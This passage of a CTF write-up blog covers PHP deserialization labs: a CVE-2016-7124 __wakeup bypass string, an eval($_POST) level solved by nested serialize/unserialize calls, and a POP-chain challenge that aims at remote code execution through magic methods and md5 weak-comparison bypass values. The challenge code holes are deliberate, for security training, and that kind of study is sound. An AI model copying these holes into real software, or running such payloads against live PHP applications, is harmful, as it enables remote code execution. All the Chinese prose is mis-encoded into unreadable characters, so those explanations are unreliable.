</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CVE-2016-7124 - PHP5 &lt; 5.6.25 / PHP7 &lt; 7.0.10</span></span><br><span class="line"><span class="comment">åœ¨è¯¥æ¼æ´ä¸­ï¼Œå½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­å¯¹è±¡å±æ€§çš„å€¼å¤§äºçœŸå®å±æ€§å€¼æ—¶ä¾¿ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œã€‚</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: æ¢å§¬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&quot;FAKEFLAG&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$flag</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;sorry,flag is gone!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦æ è¿‡<code>__wakeup()</code>æ–¹æ³•çš„è°ƒç”¨ï¼Œç»“åˆhintï¼Œå¯¹è±¡å±æ€§çš„å€¼å¤§äºçœŸå®å±æ€§å€¼æ—¶ä¾¿ä¼šè·³è¿‡wakeupçš„æ‰§è¡Œï¼Œå…ˆæ„é€ åºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&quot;FAKEFLAG&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$flag</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;sorry,flag is gone!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$flag</span>);</span><br></pre></td></tr></table></figure><p>å¾—å‡ºçš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š<code>O:4:&quot;FLAG&quot;:1:{s:4:&quot;flag&quot;;s:8:&quot;FAKEFLAG&quot;;}</code></p><p>ä¿®æ”¹å±æ€§æ•°å€¼å¾—åˆ°æ–°å­—ç¬¦ä¸²<code>O:4:&quot;FLAG&quot;:2:{s:4:&quot;flag&quot;;s:8:&quot;FAKEFLAG&quot;;}</code>ä¼ é€’å³å¯</p><br /><h3 id="GCæœºåˆ¶"><a href="#GCæœºåˆ¶" class="headerlink" title="GCæœºåˆ¶"></a>GCæœºåˆ¶</h3><h4 id="PHPSerializelabs-Level-8-æ„é€ å‡½æ•°å’Œææ„å‡½æ•°ä»¥åŠGCæœºåˆ¶"><a href="#PHPSerializelabs-Level-8-æ„é€ å‡½æ•°å’Œææ„å‡½æ•°ä»¥åŠGCæœºåˆ¶" class="headerlink" title="[PHPSerializelabs]Level 8: æ„é€ å‡½æ•°å’Œææ„å‡½æ•°ä»¥åŠGCæœºåˆ¶"></a>[PHPSerializelabs]Level 8: æ„é€ å‡½æ•°å’Œææ„å‡½æ•°ä»¥åŠGCæœºåˆ¶</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - ååºåˆ—åŒ–é¶åœº å…³å¡ 8 : æ„é€ å‡½æ•°å’Œææ„å‡½æ•° --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINTï¼šæ³¨æ„é¡ºåºå’Œæ¬¡æ•°</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: æ¢å§¬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$destruct_flag</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$construct_flag</span>;</span><br><span class="line"><span class="variable">$destruct_flag</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$construct_flag</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$class_name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;class_name = <span class="variable">$class_name</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$construct_flag</span>;</span><br><span class="line">        <span class="variable">$construct_flag</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Constructor called &quot;</span> . <span class="variable">$construct_flag</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$destruct_flag</span>;</span><br><span class="line">        <span class="variable">$destruct_flag</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Destructor called &quot;</span> . <span class="variable">$destruct_flag</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Object created*/</span></span><br><span class="line"><span class="variable">$demo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>(<span class="string">&#x27;demo&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">/*Object serialized*/</span></span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$demo</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Object unserialized*/</span></span><br><span class="line"><span class="variable">$n</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">/*unserialized object destroyed*/</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$n</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*original object destroyed*/</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$demo</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*æ³¨æ„ æ­¤å¤„ä¸ºäº†æ–¹ä¾¿æ¼”ç¤ºä¸ºæ‰‹åŠ¨é‡Šæ”¾ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå½“è„šæœ¬è¿è¡Œå®Œæ¯•åï¼Œphpä¼šå°†æœªæ˜¾å¼é”€æ¯çš„å¯¹è±¡è‡ªåŠ¨é”€æ¯ï¼Œè¯¥è¡Œä¸ºä¹Ÿä¼šè°ƒç”¨ææ„å‡½æ•°*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*æ­¤å¤– è¿˜æœ‰æ¯”è¾ƒç‰¹æ®Šçš„æƒ…å†µ: PHPçš„GC(åƒåœ¾å›æ”¶æœºåˆ¶)ä¼šåœ¨è„šæœ¬è¿è¡Œæ—¶è‡ªåŠ¨ç®¡ç†å†…å­˜ï¼Œé”€æ¯ä¸è¢«å¼•ç”¨çš„å¯¹è±¡:*/</span></span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line">Object created:Constructor called <span class="number">1</span></span><br><span class="line">Object serialized: But Nothing <span class="title function_ invoke__">Happen</span>(:</span><br><span class="line">Object <span class="attr">unserialized</span>:But nothing happened either):</span><br><span class="line">serialized Object destroyed:Destructor called <span class="number">1</span></span><br><span class="line">original Object destroyed:Destructor called <span class="number">2</span></span><br><span class="line"></span><br><span class="line">This <span class="keyword">object</span> (<span class="string">&#x27;new FLAG();&#x27;</span>) will be destroyed immediately because it is not assigned to any variable:Constructor called <span class="number">2</span></span><br><span class="line">Destructor called <span class="number">3</span></span><br><span class="line"></span><br><span class="line">Now Your Turn!, Try to get the flag!</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RELFLAG</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$flag</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Constructor called &quot;</span> . <span class="variable">$flag</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$flag</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Destructor called &quot;</span> . <span class="variable">$flag</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$flag</span> &gt; <span class="number">5</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;HelloCTF&#123;???&#125;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Check Detected flag is &quot;</span>. <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">check</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>code=unserialize(serialize(unserialize(serialize(unserialize(serialize(unserialize(serialize(new RELFLAG()))))))));</code></p><p>åˆ©ç”¨åµŒå¥—åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–è§¦å‘GCæœºåˆ¶ï¼Œ<code>serialize()</code>ã€<code>unserialize()</code>è¿™é‡Œé‡å¤è°ƒç”¨äº§ç”Ÿäº†å¤šä¸ªå¯¹è±¡ï¼ˆææ„ï¼‰ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è°ƒç”¨<code>__construct()</code>å’Œ<code>__destruct()</code>æ–¹æ³•ï¼Œä½¿<code>$flag</code>æ•°å€¼å¢åŠ çš„åŸå› æ˜¯GCæœºåˆ¶</p><br /><h4 id="æå®¢å¤§æŒ‘æˆ˜2025-popself"><a href="#æå®¢å¤§æŒ‘æˆ˜2025-popself" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜2025]popself"></a>[æå®¢å¤§æŒ‘æˆ˜2025]popself</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">æœ‰åŒå­¦è·Ÿæˆ‘è¯´ä»–åªä¼šåšä¸€ä¸ªç±»çš„phpååºåˆ—åŒ–é¢˜ï¼Œé‚£æ¥è¯•è¯•çœ‹</span><br></pre></td></tr></table></figure><br /><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">All_in_one</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KiraKiraAyu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$_4ak5ra</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$K4per</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Sams</span>Ära;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$komiko</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Fox</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Eureka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QYQS</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sleep3r</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ivory</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä»–è¿˜æ˜¯æ²¡æœ‰å¿˜è®°é‚£ä¸ª&quot;</span>.<span class="variable">$value</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>; <span class="comment">//æ­¤å¤„ä¸æ˜¯__toStringçš„è§¦å‘ç‚¹ï¼Œè¿™é‡Œ$valueä¸æ˜¯å¯¹è±¡æ˜¯å­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æ”¶é›†å¤æ—¥çš„ç¢ç‰‡å§&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$fox</span> = <span class="variable language_">$this</span>-&gt;Fox;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( !(<span class="variable">$fox</span> <span class="keyword">instanceof</span> All_in_one) &amp;&amp; <span class="variable">$fox</span>()===<span class="string">&quot;summer&quot;</span>)&#123; <span class="comment">//ç»•è¿‡ç‚¹</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;QYQS enjoy summer&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;å¼€å¯å¾ªç¯å§&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$komiko</span> = <span class="variable language_">$this</span>-&gt;komiko;</span><br><span class="line">            <span class="variable">$komiko</span>-&gt;<span class="title function_ invoke__">Eureka</span>(<span class="variable">$this</span>-&gt;L, <span class="variable">$this</span>-&gt;sleep3r); <span class="comment">//Eurekaä¸ºä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œè§¦å‘__call</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æ­å–œæˆåŠŸsignin!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;welcome to Geek_Challenge2025!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable language_">$this</span>-&gt;SamsÄra;</span><br><span class="line">        <span class="variable">$arg</span> = <span class="variable language_">$this</span>-&gt;ivory;</span><br><span class="line">        <span class="variable">$f</span>(<span class="variable">$arg</span>); <span class="comment">//åˆ©ç”¨ç‚¹</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä½ èƒ½è®©K4perå’ŒKiraKiraAyuç»„æˆä¸€é˜Ÿå—&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;K4per)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu))===<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;K4per))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;boyså’Œè€Œä¸åŒ&lt;br&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu))==<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;K4per))&#123; <span class="comment">//ç»•è¿‡ç‚¹</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;BOYâ™‚ sign GEEK&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;å¼€å¯å¾ªç¯å§&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;QYQS-&gt;partner = <span class="string">&quot;summer&quot;</span>; <span class="comment">//partnerä¸ºä¸å­˜åœ¨çš„å±æ€§ï¼Œè§¦å‘__set</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;BOYâ™‚ can`t sign GEEK&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu)).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;K4per).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;boyså ‚å ‚æ­£æ­£&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;å†èµ°ä¸€æ­¥...&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;_4ak5ra;</span><br><span class="line">        <span class="variable">$a</span>(); <span class="comment">//è§¦å‘__invoke</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span>&#123;        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$args</span>[<span class="number">0</span>])&lt;<span class="number">4</span> &amp;&amp; (<span class="variable">$args</span>[<span class="number">0</span>]+<span class="number">1</span>)&gt;<span class="number">10000</span>)&#123; <span class="comment">//ç»•è¿‡ç‚¹</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;å†èµ°ä¸€æ­¥&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$args</span>[<span class="number">1</span>]; <span class="comment">//è§¦å‘__toString</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ä½ è¦åŠªåŠ›è¿›çª„é—¨&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">summer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">find_myself</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;summer&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$payload</span> = <span class="variable">$_GET</span>[<span class="string">&quot;24_SYC.zip&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$payload</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;æ²¡æœ‰å¤§å®¶çš„å‹ç¼©åŒ…çš„è¯ï¼Œç“¦è¾¾è¥¿ï¼&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦æ˜¯phpç‰¹æ€§å’Œåºåˆ—åŒ–ï¼Œæœ€ç»ˆè¦å®ç°è§¦å‘<code>__invoke()</code>å®ç°RCEï¼Œé€†æ¨å¯ä»¥å¾—åˆ°åˆ©ç”¨é“¾<code>__invoke()</code>&lt;-<code>__toString()</code>&lt;-<code>__call()</code>&lt;-<code>__set()</code>&lt;-<code>__destruct()</code></p><p>ç¬¬ä¸€æ­¥æ˜¯ç»•è¿‡md5æ£€æŸ¥ï¼Œå¼±ç±»å‹ç»•è¿‡çš„è¦æ±‚æ˜¯0eåé¢ä¸ºçº¯æ•°å­—ï¼Œå½“æ—¶æŸ¥é˜…å¾ˆå¤šåšå®¢æŠŠå­—æ¯å‚æ‚çš„ä¹Ÿç®—äº†ï¼Œä½†æ˜¯ä¸è®ºæ”¾é¶æœºè¿˜æ˜¯æœ¬åœ°éƒ½æ˜¯è¿‡ä¸äº†çš„ï¼Œå¹¸äº<a href="https://err0r233.github.io/posts/21053.html">@eEr0r233</a>å‰è¾ˆçˆ†ç ´å‡ºæ¥äº†å‡ ä¸ªèƒ½ç”¨çš„ï¼Œç„¶åå°±æ˜¯è®©<code>QYQS</code>è§¦å‘<code>__set()</code>äº†ï¼Œç¬¬ä¸€é˜¶æ®µçš„payloadæ˜¯</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">All_in_one</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;KiraKiraAyu=<span class="string">&#x27;aawBzC&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;K4per=<span class="string">&#x27;s878926199a&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;QYQS=<span class="keyword">new</span> <span class="title class_">All_in_one</span>();</span><br></pre></td></tr></table></figure><p>åŒå±‚md5åŠ å¯†åä»ä¸º0eåŠ çº¯æ•°å­—ç±»å‹çš„å€¼</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">aawBzC</span><br><span class="line">aabsbm9</span><br><span class="line">aaaabGG5T</span><br><span class="line">aaaabKGVH</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå±‚çš„ç»•è¿‡ç‚¹æ˜¯<code>$fox</code>ä¸æ˜¯ç±»<code>All_in_one</code>çš„ä¸€ä¸ªå®ä¾‹ï¼Œä¸”å½“å®ƒè¢«å½“å‡½æ•°è°ƒç”¨æ—¶çš„è¿”å›å€¼å¼ºç­‰äº<code>&quot;summer&quot;</code>ï¼Œé‚£åªéœ€è¦è®©<code>$fox</code>æ˜¯<code>summer</code>ç±»çš„å®ä¾‹å°±å¥½äº†ï¼Œè‡³äºå¦‚ä½•è®©å®ƒè¿”å›<code>&quot;summer&quot;</code>ï¼Œè¿™é‡Œè¦ç”¨åˆ°é™æ€è°ƒç”¨æ¥ç›´æ¥é€šè¿‡ç±»åè°ƒç”¨å…¶é™æ€æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>-&gt;QYQS-&gt;Fox=[<span class="string">&#x27;summer&#x27;</span>, <span class="string">&#x27;find_myself&#x27;</span>];</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰å±‚ç»•è¿‡ç‚¹æ˜¯<code>$args</code>çš„ç¬¬1ä¸ªå…ƒç´ å­—ç¬¦é•¿åº¦å°äº4ä¸”è¯¥å…ƒç´ åŠ ä¸€è¿ç®—åå¤§äº<code>10000</code>ï¼Œè¿™é‡Œç”¨ç§‘å­¦è®¡æ•°æ³•å³å¯ï¼Œ<code>__call()</code>çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œè¿™é‡Œ<code>$args[0]</code>å°±æ˜¯<code>$this-&gt;L</code>ï¼Œ<code>$args[0]</code>å°±æ˜¯<code>$this-&gt;sleep3r</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>-&gt;QYQS-&gt;komiko=<span class="keyword">new</span> <span class="title class_">All_in_one</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;QYQS-&gt;L=<span class="string">&#x27;1e7&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;QYQS-&gt;sleep3r=<span class="keyword">new</span> <span class="title 